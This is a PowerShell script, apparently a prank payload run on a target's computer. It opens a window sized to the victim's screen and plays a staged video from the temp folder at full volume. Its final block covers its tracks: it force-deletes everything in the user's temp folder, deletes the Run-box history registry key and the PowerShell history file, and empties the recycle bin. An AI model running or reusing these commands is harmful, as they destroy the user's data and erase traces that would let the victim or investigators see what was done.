<#
.NOTES 
	This will get the dimension of the targets screen to make the wallpaper
#>

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
}
"@
$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height

#############################################################################################################################################

#WPF Library for Playing Movie and some components
Add-Type -AssemblyName PresentationFramework

Add-Type -AssemblyName System.ComponentModel
#XAML File of WPF as windows for playing movie

[xml]$XAML = @"
 
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" Height=$h Width=$w ResizeMode="NoResize">
    <Grid Margin="0,0,2,3">
        <MediaElement Height="250" Width="525" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop" Margin="8,10,10,61" />
        <Button Content="Pause" Name="PauseButton" HorizontalAlignment="Left" Margin="236,283,0,0" VerticalAlignment="Top" Width="75"/>
        <Button Content="Play" Name="PlayButton" HorizontalAlignment="Left" Margin="236,283,0,0" VerticalAlignment="Top" Width="75"/>
    </Grid>
</Window>
"@
 
#Movie Path
[uri]$VideoSource = "$env:TMP\z\e.mp4"
 
#Devide All Objects on XAML
$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName("VideoPlayer")
$PauseButton = $Window.FindName("PauseButton")
$PlayButton = $Window.FindName("PlayButton")
 
#Video Default Setting
$VideoPlayer.Volume = 100;
$VideoPlayer.Source = $VideoSource;
$VideoPlayer.Play()
$PauseButton.Visibility = [System.Windows.Visibility]::Visible
$PlayButton.Visibility = [System.Windows.Visibility]::Hidden
 
#Button click event 
$PlayButton.Add_Click({
    $VideoPlayer.Play()
    $PauseButton.Visibility = [System.Windows.Visibility]::Visible
    $PlayButton.Visibility = [System.Windows.Visibility]::Hidden
})
$PauseButton.Add_Click({
    $VideoPlayer.Pause()
    $PauseButton.Visibility = [System.Windows.Visibility]::Hidden
    $PlayButton.Visibility = [System.Windows.Visibility]::Visible
})
 
#Show Up the Window 
$Window.ShowDialog() | out-null

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue